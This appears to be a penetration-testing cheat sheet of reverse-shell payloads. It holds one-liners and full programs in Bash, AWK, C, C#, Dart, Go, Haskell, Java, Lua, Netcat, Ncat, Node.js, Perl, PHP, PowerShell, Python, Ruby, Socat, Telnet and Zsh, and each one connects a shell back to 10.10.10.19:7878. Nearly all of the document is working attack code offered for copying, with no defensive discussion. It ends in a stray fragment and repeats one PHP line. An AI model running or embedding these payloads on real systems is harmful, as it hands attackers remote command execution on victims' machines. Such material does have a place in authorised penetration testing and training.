# Reverse Shells

### AWK <a href="#awk" id="awk"></a>

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.19/7878"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Bash <a href="#bash" id="bash"></a>

```bash
#-i
bash -c >& /dev/tcp/10.10.10.19/7878 0>&1

#196
0<&196;exec 196<>/dev/tcp/10.10.10.19/7878; sh <&196 >&196 2>&196

#readline
exec 5<>/dev/tcp/10.10.10.19/7878;cat <&5 | while read line; do $line 2>&5 >&5; done

#5
sh -i 5<> /dev/tcp/10.10.10.19/7878 0<&5 1>&5 2>&5

#udp
sh -i >& /dev/udp/10.10.10.19/7878 0>&1
```

### C

#### Linux

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 7878;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.10.19");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execve("sh", argv, NULL);

    return 0;       
}
```

#### Windows

```c
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "10.10.10.19"; 
char port[6] = "7878";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
```

### Dart

```dart
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.10.10.19", 7878).then((socket) {
    socket.listen((data) {
      Process.start('sh', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

### C# <a href="#ruby" id="ruby"></a>

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.10.10.19", 7878))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### Golang <a href="#ruby" id="ruby"></a>

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.19:7878");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Haskell <a href="#java" id="java"></a>

```haskell
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 10.10.10.19 7878 >/tmp/f"
```

### Java <a href="#java" id="java"></a>

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.19/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Lua

```lua
--Type 1
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.19','7878');os.execute('sh -i <&3 >&3 2>&3');"

--Type 2
lua5.1 -e 'local host, port = "10.10.10.19", 7878 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### Netcat <a href="#netcat" id="netcat"></a>

#### Linux <a href="#linux" id="linux"></a>

```bash
#basic
nc -e /bin/sh 10.10.10.19 7878

​#pipe
nc 10.10.10.19 7878 | /bin/sh

​#mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.19 7878 >/tmp/f
```

#### Windows <a href="#windows" id="windows"></a>

```scheme
nc.exe -e cmd.exe 10.10.10.19 7878
```

### Ncat <a href="#netcat" id="netcat"></a>

#### Linux <a href="#linux" id="linux"></a>

```bash
#basic
ncat 10.10.10.19 7878 -e sh

#udp
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.10.19 7878 >/tmp/f
```

#### Windows <a href="#windows" id="windows"></a>

```scheme
ncat.exe 10.10.10.19 7878 -e sh
```

### NodeJS <a href="#nodejs" id="nodejs"></a>

```javascript
require('child_process').exec('nc -e sh 10.10.10.19 7878')
```

### Perl <a href="#perl" id="perl"></a>

```bash
#basic
perl -e 'use Socket;$i="10.10.10.19";$p=7878;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'​

#no sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.19:7878");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PHP <a href="#php" id="php"></a>

```bash
#inside PHP file
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.19/7878 0>&1'"); ?>​

#exec
php -r '$sock=fsockopen("10.10.10.19",7878);exec("/bin/sh -i <&3 >&3 2>&3");'

#shellexec
php -r '$sock=fsockopen("10.10.10.19",7878);shell_exec("sh <&3 >&3 2>&3");'

#system
php -r '$sock=fsockopen("10.10.10.19",7878);system("sh <&3 >&3 2>&3");'

#passthru
php -r '$sock=fsockopen("10.10.10.19",7878);passthru("sh <&3 >&3 2>&3");'

#``php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'
```

### Powershell <a href="#powershell" id="powershell"></a>

```scheme
powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient('10.10.10.19',7878);$str = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $str.Read($b,0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()"
```

### Python <a href="#python" id="python"></a>

```bash
#Type 1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.19",7878));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'​

#Type 2
export RHOST="10.10.10.19";export RPORT=7878;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### Ruby <a href="#ruby" id="ruby"></a>

```bash
#Type 1
ruby -rsocket -e'f=TCPSocket.open("10.10.10.19",7878).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

​#Type 2
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.19","7878");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Socat <a href="#socat" id="socat"></a>

```bash
socat TCP:10.10.10.19:7878 EXEC:sh
```

### Telnet <a href="#telnet" id="telnet"></a>

```bash
TF=$(mktemp -u);mkfifo $TF && telnet 10.10.10.19 7878 0<$TF | sh 1>$TF
```

### Zsh <a href="#netcat" id="netcat"></a>

```bash
zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.19 7878 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

#### 312312      sada  1231

\`\`\`\`
